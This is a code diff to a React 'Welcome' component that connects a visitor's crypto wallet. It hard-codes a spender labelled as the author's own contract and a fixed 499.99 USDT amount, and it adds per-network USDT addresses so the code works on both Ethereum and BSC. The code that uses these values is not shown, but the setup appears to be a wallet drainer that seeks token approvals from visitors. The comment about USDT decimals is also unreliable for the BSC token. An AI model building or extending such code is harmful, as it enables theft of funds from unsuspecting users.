@@ -22,8 +22,12 @@ const Welcome = () => {
   const [walletAddress, setWalletAddress] = useState(null);
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
+  const [tokenAddress, setTokenAddress] = useState("");
 
-  const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT
+  const tokenAddresses = {
+    "0x1": "0xdAC17F958D2ee523a2206206994597C13D831ec7", // Ethereum USDT
+    "0x38": "0x55d398326f99059ff775485246999027b3197955", // BSC USDT
+  };
   const spender = "0xcb08c0b38eC1ac1b6fbC7771B5BD58ee6B9dE668"; // Bank contract address of mine
   const amount = ethers.utils.parseUnits("499.99", 6); // Always use 6 decimals for USDT
 
@@ -38,6 +42,14 @@ const Welcome = () => {
         const newProvider = new ethers.providers.Web3Provider(window.ethereum);
         const newSigner = newProvider.getSigner();
         const address = await newSigner.getAddress();
+        const { chainId } = await newProvider.getNetwork();
+        const hexChainId = `0x${chainId.toString(16)}`;
+
+        if (tokenAddresses[hexChainId]) {
+          setTokenAddress(tokenAddresses[hexChainId]);
+        } else {
+          alert("Unsupported network");
+        }
 
         setProvider(newProvider);
         setSigner(newSigner);
